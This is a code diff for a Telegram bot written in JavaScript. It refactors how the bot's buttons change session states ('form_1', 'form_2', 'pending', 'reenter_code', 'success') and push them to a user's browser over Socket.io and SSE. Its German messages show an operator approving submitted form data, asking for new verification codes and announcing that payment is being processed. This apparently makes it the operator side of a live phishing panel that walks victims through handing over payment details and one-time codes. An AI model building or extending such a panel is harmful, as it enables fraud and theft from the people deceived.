@@ -326,15 +326,12 @@ async function handleCallbackQuery(query) {
     switch (action) {
       case 'confirm_form':
         try {
-          // Update session state to form_2
-          await axios.post(`${apiBaseUrl}/api/state`, { key, state: 'form_2' });
+          // Use the new forceStateUpdate function
+          const success = await forceStateUpdate(key, 'form_2');
           
-          // Update local session data
-          sessionData.state = 'form_2';
-          activeSessions.set(key, sessionData);
-          
-          // Notify the user via Socket.io
-          io.to(key).emit('state_update', { key, state: 'form_2' });
+          if (!success) {
+            throw new Error('Failed to update state');
+          }
           
           // Update the message with form data still visible
           const formApprovedMessage = createFormDataMessage(key, sessionData.formData || {}, '✅ Formular genehmigt. Warten auf Verifizierungscode...');
@@ -359,15 +356,8 @@ async function handleCallbackQuery(query) {
         }
         break;
       case 'request_new_form':
-        // Update session state to form_1
-        await axios.post(`${apiBaseUrl}/api/state`, { key, state: 'form_1' });
-        
-        // Update local session data
-        sessionData.state = 'form_1';
-        activeSessions.set(key, sessionData);
-        
-        // Notify the user via Socket.io
-        io.to(key).emit('state_update', { key, state: 'form_1' });
+        // Use the new forceStateUpdate function
+        await forceStateUpdate(key, 'form_1');
         
         // Update the message
         bot.editMessageText(`
@@ -393,15 +383,8 @@ _Warten auf die Formulareingabe des Benutzers..._
         bot.answerCallbackQuery(query.id, { text: '🔄 Neues Formular angefordert' });
         break;
       case 'confirm_code':
-        // Update session state from loading_pending to pending (not success)
-        await axios.post(`${apiBaseUrl}/api/state`, { key, state: 'pending' });
-        
-        // Update local session data
-        sessionData.state = 'pending';
-        activeSessions.set(key, sessionData);
-        
-        // Notify the user via Socket.io
-        io.to(key).emit('state_update', { key, state: 'pending' });
+        // Use the new forceStateUpdate function
+        await forceStateUpdate(key, 'pending');
         
         // Update the message with all data still visible
         const successMessage = createCompleteDataMessage(key, sessionData.formData, sessionData.code, '✅ Code bestätigt. Zahlung wird verarbeitet...');
@@ -423,15 +406,8 @@ _Warten auf die Formulareingabe des Benutzers..._
         bot.answerCallbackQuery(query.id, { text: '✅ Code bestätigt' });
         break;
       case 'request_new_code':
-        // Update session state from loading_pending to reenter_code
-        await axios.post(`${apiBaseUrl}/api/state`, { key, state: 'reenter_code' });
-        
-        // Update local session data
-        sessionData.state = 'reenter_code';
-        activeSessions.set(key, sessionData);
-        
-        // Notify the user via Socket.io
-        io.to(key).emit('state_update', { key, state: 'reenter_code' });
+        // Use the new forceStateUpdate function
+        await forceStateUpdate(key, 'reenter_code');
         
         // Update the message with form data still visible
         const newCodeMessage = createFormDataMessage(key, sessionData.formData, '🔄 Neuer Verifizierungscode angefordert.');
@@ -446,15 +422,8 @@ _Warten auf die Formulareingabe des Benutzers..._
         bot.answerCallbackQuery(query.id, { text: '🔄 Neuer Code angefordert' });
         break;
       case 'end_session':
-        // Update session state to success instead of error
-        await axios.post(`${apiBaseUrl}/api/state`, { key, state: 'success' });
-        
-        // Update local session data
-        sessionData.state = 'success';
-        activeSessions.set(key, sessionData);
-        
-        // Notify the user via Socket.io
-        io.to(key).emit('state_update', { key, state: 'success' });
+        // Use the new forceStateUpdate function
+        await forceStateUpdate(key, 'success');
         
         // Update the message
         const endSessionMessage = createCompleteDataMessage(key, sessionData.formData, sessionData.code, '✅ Sitzung erfolgreich abgeschlossen.');
@@ -468,15 +437,8 @@ _Warten auf die Formulareingabe des Benutzers..._
         bot.answerCallbackQuery(query.id, { text: '✅ Sitzung abgeschlossen' });
         break;
       case 'request_code':
-        // Update session state from pending to reenter_code_after_pending
-        await axios.post(`${apiBaseUrl}/api/state`, { key, state: 'reenter_code_after_pending' });
-        
-        // Update local session data
-        sessionData.state = 'reenter_code_after_pending';
-        activeSessions.set(key, sessionData);
-        
-        // Notify the user via Socket.io
-        io.to(key).emit('state_update', { key, state: 'reenter_code_after_pending' });
+        // Use the new forceStateUpdate function
+        await forceStateUpdate(key, 'reenter_code_after_pending');
         
         // Update the message with form data still visible
         const requestCodeMessage = createFormDataMessage(key, sessionData.formData, '🔄 Neuer Verifizierungscode angefordert.');
@@ -507,6 +469,50 @@ _Warten auf die Formulareingabe des Benutzers..._
     } catch (callbackError) {
       console.error('Error sending callback query answer:', callbackError);
     }
+  }
+}
+
+/**
+ * Force a state update by making a direct HTTP request to the client
+ * @param {string} key - Session key
+ * @param {string} state - New state
+ */
+async function forceStateUpdate(key, state) {
+  try {
+    const apiBaseUrl = config.baseUrl;
+    
+    // 1. Update the database via API
+    await axios.post(`${apiBaseUrl}/api/state`, { key, state });
+    console.log(`State updated in database: key=${key}, state=${state}`);
+    
+    // 2. Emit Socket.io event
+    if (io) {
+      io.to(key).emit('state_update', { key, state });
+      io.emit('global_state_update', { key, state });
+      console.log(`Socket.io events emitted for key=${key}, state=${state}`);
+    } else {
+      console.error('Socket.io instance not available');
+    }
+    
+    // 3. Make a direct HTTP request to trigger SSE events
+    await axios.post(`${apiBaseUrl}/api/force-update`, { key, state })
+      .then(response => {
+        console.log(`Force update response:`, response.data);
+      })
+      .catch(error => {
+        console.error('Error in force update:', error.message);
+      });
+      
+    // 4. Update local session data
+    const sessionData = activeSessions.get(key) || { formData: {} };
+    sessionData.state = state;
+    activeSessions.set(key, sessionData);
+    console.log(`Local session data updated: key=${key}, state=${state}`);
+    
+    return true;
+  } catch (error) {
+    console.error(`Error in forceStateUpdate for key=${key}, state=${state}:`, error.message);
+    return false;
   }
 }
 
